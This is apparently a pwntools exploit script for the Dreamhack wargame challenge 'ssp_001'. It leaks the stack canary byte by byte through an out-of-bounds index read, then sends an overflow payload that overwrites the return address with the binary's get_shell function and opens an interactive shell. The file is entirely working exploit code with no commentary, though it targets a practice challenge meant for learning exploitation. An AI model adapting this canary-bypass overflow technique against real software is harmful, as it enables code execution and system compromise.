from pwn import *
#context.log_level='debug'

n = remote('host1.dreamhack.games',8395)
elf = ELF('./ssp_001')

box_canary_offset = 0x80
index = 128
leak_addr = []

payload = b'A'*0x40

for i in range(4):
	n.sendlineafter('> ','P')
	n.sendlineafter('Element index : ',str(index))
	index += 1
	n.recvuntil('is : ')
	temp = n.recvuntilS('\n')[:-1]
	payload += bytearray.fromhex(temp)


payload += b'B'*0x4
payload += b'C'*0x4
payload += p32(elf.symbols['get_shell'])

log.info(payload)

n.sendlineafter('> ','E')
n.sendlineafter('Name Size : ','1000')
n.sendlineafter('Name : ',payload)

n.interactive()
